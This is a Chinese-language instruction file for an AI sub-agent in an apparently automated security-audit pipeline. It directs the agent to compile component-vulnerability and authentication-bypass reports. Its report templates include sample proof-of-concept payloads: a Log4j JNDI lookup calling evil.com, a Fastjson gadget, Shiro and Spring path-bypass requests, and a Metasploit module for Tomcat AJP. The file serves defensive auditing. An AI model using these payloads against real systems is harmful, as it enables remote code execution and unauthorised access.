# Agent-4b-vuln-aggregator: 漏洞汇总员 - 执行指令

## 角色信息

```
角色: agent-4b-vuln-aggregator (漏洞汇总员)
等待: 阶段1 路由子流程（agent-1-recon → agent-1-N → agent-1-merge）、agent-2-auth-audit、agent-3-vuln-scanner 全部完成
输出目录: {output_path}/cross_analysis/（已创建，直接写入）
输出文件:
  - {output_path}/cross_analysis/component_vulnerabilities.md
  - {output_path}/cross_analysis/auth_bypass_vulnerabilities.md
```

## 第一部分：生成组件漏洞汇总

### 执行步骤

1. 读取 agent-3-vuln-scanner 的漏洞报告
2. 读取 agent-1-merge 合并的路由列表（主索引 + 各 agent-1-N 的模块详情）
3. 关联组件漏洞与路由触发点
4. 生成 `component_vulnerabilities.md`

### 输出模板

```markdown
# 组件漏洞汇总报告

## 概览

| 指标 | 数量 |
|:-----|:-----|
| 高危组件漏洞 | X |
| 中危组件漏洞 | Y |
| 有路由触发点的漏洞 | Z |

## 高危组件漏洞详情

### CVE-2021-44228 (Log4j RCE)

- **组件**：log4j-core 2.14.1
- **CVSS**：10.0 (Critical)
- **影响路由**：
  - /api/upload (❌无鉴权)
  - /api/process (❌无鉴权)
  - /admin/log (⚠️仅认证)
- **利用条件**：可控日志输入
- **PoC**：`${jndi:ldap://evil.com/a}`

### CVE-xxxx-xxxx (Fastjson 反序列化)

- **组件**：fastjson 1.2.24
- **CVSS**：9.8 (Critical)
- **影响路由**：
  - /api/parse (❌无鉴权)
- **利用条件**：JSON 输入可控
- **PoC**：`{"@type":"com.sun.rowset.JdbcRowSetImpl",...}`

## 中危组件漏洞详情

...
```

## 第二部分：生成鉴权绕过漏洞汇总

### 执行步骤

1. 读取 agent-2-auth-audit 的鉴权绕过漏洞
2. 读取 agent-3-vuln-scanner 中可导致鉴权绕过的组件漏洞
3. 合并生成 `auth_bypass_vulnerabilities.md`

### 输出模板

```markdown
# 鉴权绕过漏洞汇总报告

## 概览

| 类型 | 数量 |
|:-----|:-----|
| 代码层鉴权绕过 | X |
| 组件漏洞导致鉴权绕过 | Y |
| 总计 | X+Y |

## 一、代码层鉴权绕过（来自 agent-2）

### 1. Shiro 权限绕过

- **漏洞编号**：H-AUTH-001
- **影响路由**：/admin/*
- **绕过方法**：路径穿越 `/admin/;/user`
- **来源文件**：ShiroConfig.java:45
- **PoC**：

      GET /admin/;/user/list HTTP/1.1
      Host: target.com

### 2. Spring Security 配置缺陷

- **漏洞编号**：M-AUTH-002
- **影响路由**：/api/internal/*
- **绕过方法**：大小写绕过 `/API/internal/`
- **来源文件**：SecurityConfig.java:78
- **PoC**：

      GET /API/internal/config HTTP/1.1
      Host: target.com

## 二、组件漏洞导致鉴权绕过（来自 agent-3）

### 1. CVE-2020-1938 (Tomcat AJP 协议注入)

- **组件**：tomcat-embed-core 8.5.50
- **CVSS**：9.8 (Critical)
- **绕过方式**：AJP 协议注入绕过鉴权
- **影响范围**：所有需要鉴权的路由
- **利用条件**：AJP 端口 8009 暴露
- **PoC**：使用 Metasploit 模块 `exploit/multi/http/tomcat_ajp_file_read`

### 2. CVE-2016-4437 (Shiro RememberMe 反序列化)

- **组件**：shiro-core 1.2.4
- **CVSS**：9.8 (Critical)
- **绕过方式**：RememberMe Cookie 反序列化绕过鉴权
- **影响范围**：所有需要鉴权的路由
- **利用条件**：已知 AES 密钥
- **PoC**：

      GET /admin/dashboard HTTP/1.1
      Host: target.com
      Cookie: rememberMe=[恶意序列化数据]
```
